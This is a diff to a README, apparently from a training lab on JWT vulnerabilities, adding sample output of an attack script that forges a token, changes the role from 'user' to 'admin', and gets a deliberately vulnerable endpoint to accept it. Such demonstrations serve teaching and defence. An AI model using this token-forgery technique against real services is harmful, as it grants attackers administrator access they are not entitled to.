@@ -206,7 +206,26 @@ python exploits/05_alg_confusion.py
 
 ### Output
 
-*(Coming soon)*
+```
+============================================================
+ATTACK 1 - Missing signature verification
+============================================================
+
+[1] Logging in as 'user'...
+    Token received: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c...
+
+[2] Original payload: {'sub': 'user', 'role': 'user', 'exp': 1781708472}
+
+[3] Forged payload:   {'sub': 'admin', 'role': 'admin', 'exp': 1781708472}
+
+[4] Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ...
+
+[5] Sending forged token to /vuln/no-verify...
+
+[6] Server response: {'message': 'Welcome, admin! Your role is: admin', 'payload': {'sub': 'admin', 'role': 'admin', 'exp': 1781708472}}
+
+[!] ATTACK SUCCESSFUL - Server accepted a token with a fake signature
+```
 
 ---
 
